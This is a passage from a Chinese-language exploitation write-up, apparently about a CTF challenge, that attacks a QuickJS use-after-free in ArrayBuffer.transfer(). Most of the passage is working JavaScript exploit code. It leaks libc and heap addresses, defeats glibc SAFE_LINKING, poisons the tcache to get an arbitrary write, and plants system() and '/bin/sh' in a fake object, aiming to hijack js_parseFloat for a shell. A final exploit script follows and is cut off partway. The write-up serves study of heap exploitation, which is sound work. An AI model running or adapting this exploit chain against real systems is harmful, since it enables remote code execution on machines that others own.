<h4 data-id="heading-22">实验3：任意地址写入验证</h4>
<p>结合tcache投毒技术，我们可以实现任意地址写入：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// arbitrary_write_verify.js - 验证任意写能力</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">tohex</span>(<span class="hljs-params">v</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"0x"</span> + v.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">16</span>, <span class="hljs-string">"0"</span>);
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Arbitrary Write Capability Verification"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Technique: Tcache Poisoning"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段1: 地址泄露 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 1] Address leaking..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 复用前面的泄露技术</span>
<span class="hljs-keyword">const</span> tmp1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> tmp5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);

<span class="hljs-keyword">const</span> ab1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> ta1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1);

<span class="hljs-keyword">const</span> tmp2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);

<span class="hljs-keyword">let</span> ab1_f = ab1.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta1_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1_f);
ab1_f = <span class="hljs-literal">null</span>;
ta1_f = <span class="hljs-literal">null</span>;

<span class="hljs-keyword">const</span> libc_leak = ta1[<span class="hljs-number">0</span>];
<span class="hljs-keyword">const</span> libc_base = libc_leak - <span class="hljs-number">0x203b20n</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Libc base leaked: "</span> + <span class="hljs-title function_">tohex</span>(libc_base));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段2: 堆地址泄露 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 2] Heap address leaking via tcache..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 创建合适大小的chunk进入tcache</span>
<span class="hljs-keyword">const</span> ab2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab2);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created ArrayBuffer of size 0xa0"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] This size will use tcache bin"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">let</span> ab2_f = ab2.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta2_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab2_f);
ab2_f = <span class="hljs-literal">null</span>;
ta2_f = <span class="hljs-literal">null</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Freed the chunk via transfer()"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Chunk entered tcache bin"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 读取tcache的next指针（经过SAFE_LINKING保护）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 3] Reading tcache metadata..."</span>);

<span class="hljs-keyword">const</span> heap_xor = ta2[<span class="hljs-number">0</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Raw tcache next (XORed): "</span> + <span class="hljs-title function_">tohex</span>(heap_xor));

<span class="hljs-comment">// SAFE_LINKING: next = (next_ptr &gt;&gt; 12) ^ heap_base</span>
<span class="hljs-comment">// 恢复真实堆地址</span>
<span class="hljs-keyword">const</span> heap_addr = heap_xor &lt;&lt; <span class="hljs-number">12n</span>;
<span class="hljs-keyword">const</span> heap_base = heap_addr - <span class="hljs-number">0x9000n</span> - <span class="hljs-number">0x14000n</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Decoded heap address: "</span> + <span class="hljs-title function_">tohex</span>(heap_addr));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Calculated heap base: "</span> + <span class="hljs-title function_">tohex</span>(heap_base));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 计算目标写入地址</span>
<span class="hljs-keyword">const</span> target_offset = <span class="hljs-number">0x3120n</span>;
<span class="hljs-keyword">const</span> target_addr = heap_base + target_offset;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Target write address: "</span> + <span class="hljs-title function_">tohex</span>(target_addr));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      (This is where we want to allocate a chunk)"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段4: Tcache投毒 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 4] Tcache poisoning attack..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 创建更多相同大小的chunk来操作tcache链</span>
<span class="hljs-keyword">const</span> ab3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab3);

<span class="hljs-keyword">const</span> ab4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab4);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created ab3 and ab4 (size 0xa0)"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 释放它们进入tcache</span>
<span class="hljs-keyword">let</span> ab3_f = ab3.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta3_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab3_f);
ab3_f = <span class="hljs-literal">null</span>;
ta3_f = <span class="hljs-literal">null</span>;

<span class="hljs-keyword">let</span> ab4_f = ab4.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta4_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab4_f);
ab4_f = <span class="hljs-literal">null</span>;
ta4_f = <span class="hljs-literal">null</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Freed both chunks into tcache"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Tcache bin now has: ab4 -&gt; ab3 -&gt; ab2 -&gt; ..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 关键：通过UAF修改ab4的next指针</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 5] Poisoning tcache next pointer..."</span>);

<span class="hljs-keyword">const</span> poisoned_next = target_addr ^ (heap_xor + <span class="hljs-number">0x00n</span>);
ta4[<span class="hljs-number">0</span>] = poisoned_next;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Original next: "</span> + <span class="hljs-title function_">tohex</span>(ta4[<span class="hljs-number">0</span>]));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Poisoned next: "</span> + <span class="hljs-title function_">tohex</span>(poisoned_next));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] After XOR decode, points to: "</span> + <span class="hljs-title function_">tohex</span>(target_addr));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [!] Tcache chain now: ab4 -&gt; TARGET_ADDR -&gt; ..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段6: 分配到目标地址 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 6] Allocating chunk at controlled address..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 第一次分配消耗ab4</span>
<span class="hljs-keyword">const</span> ab5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab5);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Allocated ab5 (consumes ab4 from tcache)"</span>);

<span class="hljs-comment">// 触发一个操作来稳定状态（可选，根据题目调整）</span>
<span class="hljs-keyword">let</span> dummy = ab2.<span class="hljs-property">resizable</span>;

<span class="hljs-comment">// 第二次分配会得到target_addr！</span>
<span class="hljs-keyword">const</span> ab6 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta6 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab6);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Allocated ab6"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  \x1b[1;32m[✓] ab6's backing store is at our target address!\x1b[0m"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段7: 验证写入能力 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 7] Verifying arbitrary write..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 写入测试数据</span>
<span class="hljs-keyword">const</span> magic1 = <span class="hljs-number">0xDEADBEEFCAFEBABEn</span>;
<span class="hljs-keyword">const</span> magic2 = <span class="hljs-number">0x1337133713371337n</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Writing magic values..."</span>);
ta6[<span class="hljs-number">0</span>] = magic1;
ta6[<span class="hljs-number">1</span>] = magic2;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta6[0] = "</span> + <span class="hljs-title function_">tohex</span>(magic1));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta6[1] = "</span> + <span class="hljs-title function_">tohex</span>(magic2));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 读取验证</span>
<span class="hljs-keyword">const</span> read_back_0 = ta6[<span class="hljs-number">0</span>];
<span class="hljs-keyword">const</span> read_back_1 = ta6[<span class="hljs-number">1</span>];

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Reading back..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta6[0] = "</span> + <span class="hljs-title function_">tohex</span>(read_back_0));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta6[1] = "</span> + <span class="hljs-title function_">tohex</span>(read_back_1));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">if</span> (read_back_0 === magic1 &amp;&amp; read_back_1 === magic2) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  \x1b[1;32m[✓] Write and read back successful!\x1b[0m"</span>);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  \x1b[1;31m[✗] Values don't match!\x1b[0m"</span>);
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段8: 构造复杂结构 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 8] Writing complex exploit structure..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">const</span> system_addr = libc_base + <span class="hljs-number">0x58750n</span>;
<span class="hljs-keyword">const</span> binsh_str_addr = heap_base + <span class="hljs-number">0x19c0n</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Computed addresses:"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      system() = "</span> + <span class="hljs-title function_">tohex</span>(system_addr));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      /bin/sh location = "</span> + <span class="hljs-title function_">tohex</span>(binsh_str_addr));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 初始化内存</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Initializing memory region..."</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ta6.<span class="hljs-property">length</span>; i++) {
    ta6[i] = <span class="hljs-number">1n</span>;
}

<span class="hljs-comment">// 构造fake对象结构（用于后续RIP劫持）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Writing exploit payload..."</span>);

ta6[<span class="hljs-number">0</span>] = binsh_str_addr;           <span class="hljs-comment">// 命令字符串指针</span>
ta6[<span class="hljs-number">1</span>] = <span class="hljs-number">0x51n</span>;                    <span class="hljs-comment">// chunk size字段</span>
ta6[<span class="hljs-number">2</span>] = <span class="hljs-number">0xc010000000002n</span>;         <span class="hljs-comment">// 对象flags</span>
ta6[<span class="hljs-number">3</span>] = heap_base + <span class="hljs-number">0x3178n</span>;      <span class="hljs-comment">// 链表指针1</span>
ta6[<span class="hljs-number">4</span>] = heap_base + <span class="hljs-number">0x3178n</span>;      <span class="hljs-comment">// 链表指针2</span>
ta6[<span class="hljs-number">6</span>] = heap_base + <span class="hljs-number">0x3178n</span>;      <span class="hljs-comment">// 链表指针3</span>
ta6[<span class="hljs-number">7</span>] = heap_base + <span class="hljs-number">0x3178n</span>;      <span class="hljs-comment">// 链表指针4</span>
ta6[<span class="hljs-number">8</span>] = heap_base + <span class="hljs-number">0x3178n</span>;      <span class="hljs-comment">// 链表指针5</span>
ta6[<span class="hljs-number">9</span>] = system_addr;              <span class="hljs-comment">// 函数指针 &lt;- 关键！</span>
ta6[<span class="hljs-number">11</span>] = <span class="hljs-number">0x68732f6e69622fn</span>;       <span class="hljs-comment">// "/bin/sh" 字符串内容</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Payload structure:"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      [0x00] String pointer: "</span> + <span class="hljs-title function_">tohex</span>(ta6[<span class="hljs-number">0</span>]));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      [0x08] Chunk size:     "</span> + <span class="hljs-title function_">tohex</span>(ta6[<span class="hljs-number">1</span>]));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      [0x10] Flags:          "</span> + <span class="hljs-title function_">tohex</span>(ta6[<span class="hljs-number">2</span>]));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      [0x48] Function ptr:   "</span> + <span class="hljs-title function_">tohex</span>(ta6[<span class="hljs-number">9</span>]) + <span class="hljs-string">" &lt;- system()"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      [0x58] String content: "</span> + <span class="hljs-title function_">tohex</span>(ta6[<span class="hljs-number">11</span>]) + <span class="hljs-string">" &lt;- '/bin/sh'"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 总结 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Summary] Arbitrary Write Capability:"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Leaked libc base address"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Leaked heap base address via SAFE_LINKING"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Poisoned tcache next pointer via UAF"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Allocated chunk at arbitrary address"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Successfully wrote controlled data"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Constructed exploit payload for RIP hijack"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;32m[+] Arbitrary write primitive fully functional!\x1b[0m"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[+] Ready for control flow hijacking"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
</code></pre>
<p><strong>关键技术点解析：</strong></p>
<ol>
<li>
<p><strong>SAFE_LINKING绕过</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">存储的next指针 = (真实next地址 &gt;&gt; 12) ^ (heap_base &gt;&gt; 12)

已知存储值heap_xor，恢复过程：
<span class="hljs-attr">heap_addr</span> = heap_xor &lt;&lt; <span class="hljs-number">12</span>
heap_base ≈ heap_addr - 偏移量

投毒时：
<span class="hljs-attr">poisoned</span> = target_addr ^ (heap_xor + adjustment)
</code></pre>
</li>
<li>
<p><strong>Tcache链操作</strong>：</p>
<pre><code class="hljs language-rust" lang="rust">初始状态: tcache <span class="hljs-punctuation">-&gt;</span> ab4 <span class="hljs-punctuation">-&gt;</span> ab3 <span class="hljs-punctuation">-&gt;</span> ab2 <span class="hljs-punctuation">-&gt;</span> ...

修改ab4<span class="hljs-punctuation">-&gt;</span>next = target_addr:
状态变化: tcache <span class="hljs-punctuation">-&gt;</span> ab4 <span class="hljs-punctuation">-&gt;</span> target_addr <span class="hljs-punctuation">-&gt;</span> ???

第一次malloc: 返回ab4，tcache <span class="hljs-punctuation">-&gt;</span> target_addr <span class="hljs-punctuation">-&gt;</span> ???
第二次malloc: 返回target_addr，我们控制的地址！
</code></pre>
</li>
<li>
<p><strong>内存布局</strong>：目标地址选择heap_base+0x3120，这里存储着QuickJS的关键数据结构，包括函数指针表</p>
</li>
</ol>
<h3 data-id="heading-23">完整利用链构造</h3>
<p>理解了读写原语后，我们来构造完整的exploit。</p>
<h4 data-id="heading-24">利用策略</h4>
<p>整个利用链的思路是：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-number">1</span>. UAF触发
   ↓
<span class="hljs-number">2</span>. 泄露libc地址 (通过unsorted bin)
   ↓
<span class="hljs-number">3</span>. 泄露heap地址 (通过tcache SAFE_LINKING)
   ↓
<span class="hljs-number">4</span>. Tcache投毒指向目标地址
   ↓
<span class="hljs-number">5</span>. 分配到目标地址，获得任意写
   ↓
<span class="hljs-number">6</span>. 覆写函数指针为<span class="hljs-built_in">system</span>()
   ↓
<span class="hljs-number">7</span>. 构造RDI指向"/bin/sh"
   ↓
<span class="hljs-number">8</span>. 触发函数调用
   ↓
<span class="hljs-number">9</span>. getshell!
</code></pre>
<h4 data-id="heading-25">目标选择：js_parseFloat函数指针</h4>
<p>在QuickJS中，许多内置函数的指针存储在堆上的函数表中。通过分析，我们选择<code>js_parseFloat</code>作为劫持目标，原因：</p>
<ol>
<li><strong>位置固定</strong>：存储在heap_base+固定偏移处</li>
<li><strong>容易触发</strong>：调用<code>parseFloat()</code>即可</li>
<li><strong>参数可控</strong>：调用时RDI指向我们可控的字符串</li>
</ol>
<h4 data-id="heading-26">函数调用约定</h4>
<p>在x86-64 System V ABI中：</p>
<ul>
<li>RDI：第一个参数</li>
<li>RSI：第二个参数</li>
<li>RDX：第三个参数</li>
<li>...</li>
</ul>
<p>当我们劫持<code>js_parseFloat</code>为<code>system</code>后，调用<code>parseFloat(xxx)</code>时，RDI会指向参数字符串的地址。如果我们能让RDI指向"/bin/sh"，就能执行<code>system("/bin/sh")</code>。</p>
<h4 data-id="heading-27">最终Exploit</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">tohex</span>(<span class="hljs-params">v</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">"0x"</span> + v.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">16</span>, <span class="hljs-string">"0"</span>);
}
vlog = <span class="hljs-function">(<span class="hljs-params">x</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tohex</span>(x));
<span class="hljs-keyword">const</span> tmp1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> tmp5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> ab1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> ta1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1);
<span class="hljs-keyword">const</span> tmp2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">let</span> ab1_f = ab1.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta1_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1_f);
ab1_f = <span class="hljs-literal">null</span>;
ta1_f = <span class="hljs-literal">null</span>;
libc_addr = ta1[<span class="hljs-number">0</span>] - <span class="hljs-number">0x203b20n</span>;
fstderr = libc_addr + <span class="hljs-number">0x2044e0n</span>;
system = libc_addr + <span class="hljs-number">0x58750n</span>;
<span class="hljs-keyword">const</span> ab2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab2);
<span class="hljs-keyword">let</span> ab2_f = ab2.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta2_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab2_f);
ab2_f = <span class="hljs-literal">null</span>;
ta2_f = <span class="hljs-literal">null</span>;
heap_xor = ta2[<span class="hljs-number">0</span>];
heap_addr = ta2[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">12n</span>;
heap_base = heap_addr - <span class="hljs-number">0x9000n</span> - <span class="hljs-number">0x14000n</span>;
map_addr = heap_base + <span class="hljs-number">0x3120n</span>;
<span class="hljs-keyword">const</span> ab3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab3);
<span class="hljs-keyword">const</span> ab4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab4);
<span class="hljs-keyword">let</span> ab3_f = ab3.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta3_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab3_f);
<span class="hljs-keyword">let</span> ab4_f = ab4.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta4_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab4_f);
ab3_f = <span class="hljs-literal">null</span>;
ta3_f = <span class="hljs-literal">null</span>;
ab4_f = <span class="hljs-literal">null</span>;
ta4_f = <span class="hljs-literal">null</span>;
ta4[<span class="hljs-number">0</span>] = map_addr ^ (heap_xor + <span class="hljs-number">0x00n</span>);
<span class="hljs-keyword">const</span> ab5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab5);
<span class="hljs-keyword">let</span> tmp = ab2.<span class="hljs-property">resizable</span>;
<span class="hljs-keyword">const</span> ab6 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta6 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab6);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ta6.<span class="hljs-property">length</span>; i++) {
  ta6[i] = <span class="hljs-number">1n</span>;
}
ta6[<span class="hljs-number">0</span>] = heap_base + <span class="hljs-number">0x19c0n</span>;
ta6[<span class="hljs-number">1</span>] = <span class="hljs-number">0x51n</span>;
ta6[<span class="hljs-number">2</span>] = <span class="hljs-number">0xc010000000002n</span>;
ta6[<span class="hljs-number">3</span>] = heap_base + <span class="hljs-number">0x3178n</span>;
